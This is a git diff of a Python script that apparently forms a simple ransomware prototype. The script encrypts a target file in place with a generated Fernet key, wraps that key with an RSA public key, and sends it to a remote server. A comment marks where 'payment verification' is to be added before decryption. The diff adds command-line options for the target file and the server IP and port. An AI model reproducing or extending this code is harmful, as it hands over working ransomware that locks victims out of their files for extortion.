@@ -13,8 +13,13 @@ from cryptography.hazmat.primitives.asymmetric import padding
 from cryptography.hazmat.primitives import hashes
 from cryptography.fernet import Fernet
 import socket
+import argparse
 
 
+class AttrDict(dict):
+    def __init__(self, *args, **kwargs):
+        super(AttrDict, self).__init__(*args, **kwargs)
+        self.__dict__ = self
 # take the file path and key
 # create a Fernet instance with the key - we dont need to generate a new one, 
 # we are trying to use the decrypted symmetric 
@@ -50,58 +55,73 @@ def sendEncryptedKey(eKeyFilePath):
             decryptFile(filePath, returned_key)
 
 
+ 
+
+if __name__ == "__main__":
+
+
+
 # add CL Args here using arg parse.
 # Args include: 
 #   File to Encrypt (reqd), 
 #   IP/Port of the server(to be put on the cloud, req'd later, not for testing)
-#   
+#  
+    
+    parser = argparse.ArgumentParser()
+    
+    parser.add_argument('-f', '--file', required=True, help="File to encrypt") # will also need to make this multiple files!
+    parser.add_argument('-c', '--configipendpoint',required=True, help="IP/Port; Accepted format is: 'ip:port'")
 
 
+    args = parser.parse_args()
+    allargs = (vars(args))
+    allargs = AttrDict(allargs)
+    
+    if allargs.file is None:
+        print("None")
+    # This line generates a Fernet key
+    symmetricKey = Fernet.generate_key()
+    # The key is then passed into the Fernet instance
+    FernetInstance = Fernet(symmetricKey)
 
-
-# This line generates a Fernet key
-symmetricKey = Fernet.generate_key()
-# The key is then passed into the Fernet instance
-FernetInstance = Fernet(symmetricKey)
-
-# A previously made key using opensll is loaded into the program and 
-# read and serialized
-with open(".\Keys\public_key.key", "rb") as key_file:
-    public_key = serialization.load_pem_public_key(
-      key_file.read(),
-      backend=default_backend()
+    # A previously made key using opensll is loaded into the program and 
+    # read and serialized
+    with open(".\Keys\public_key.key", "rb") as key_file:
+        public_key = serialization.load_pem_public_key(
+        key_file.read(),
+        backend=default_backend()
+        )
+    # This is where we use the public key to encypt the symmetric key we generated 
+    # earlier 
+    encryptedSymmetricKey = public_key.encrypt(
+    symmetricKey,
+    padding.OAEP(
+        mgf=padding.MGF1(algorithm=hashes.SHA256()),
+        algorithm=hashes.SHA256(),
+        label=None
+        )
     )
-# This is where we use the public key to encypt the symmetric key we generated 
-# earlier 
-encryptedSymmetricKey = public_key.encrypt(
-   symmetricKey,
-   padding.OAEP(
-      mgf=padding.MGF1(algorithm=hashes.SHA256()),
-      algorithm=hashes.SHA256(),
-      label=None
-      )
-   )
-# write the encrypted symmertric key to the hard disk
-with open("encryptedSymmertricKey.key", "wb") as key_file:
-    key_file.write(encryptedSymmetricKey)
+    # write the encrypted symmertric key to the hard disk
+    with open("encryptedSymmertricKey.key", "wb") as key_file:
+        key_file.write(encryptedSymmetricKey)
 
-filePath = ".\File1.txt"
-# open the file that is to be encrypted... and encrypt it
-with open(filePath, "rb") as file:
-    file_data = file.read()
-    encrypted_data = FernetInstance.encrypt(file_data)
+    filePath = ".\File1.txt"
+    # open the file that is to be encrypted... and encrypt it
+    with open(filePath, "rb") as file:
+        file_data = file.read()
+        encrypted_data = FernetInstance.encrypt(file_data)
 
-# write the encrypted file back to the filepath, overwriting the information 
-# with encyption
-with open(filePath, "wb") as file:
-    file.write(encrypted_data)
-# load up the encrypted key to send to the server that is running. 
-    eKeyFilePath = ".\encryptedSymmertricKey.key"
-# Create the variables for host/port
+    # write the encrypted file back to the filepath, overwriting the information 
+    # with encyption
+    with open(filePath, "wb") as file:
+        file.write(encrypted_data)
+    # load up the encrypted key to send to the server that is running. 
+        eKeyFilePath = ".\encryptedSymmertricKey.key"
+    # Create the variables for host/port
 
-#THIS IS WHERE We need to add the payment verification. 
+    #THIS IS WHERE We need to add the payment verification.
 
 
-sendEncryptedKey(eKeyFilePath)
+    sendEncryptedKey(eKeyFilePath)
 
-quit()
+    quit()
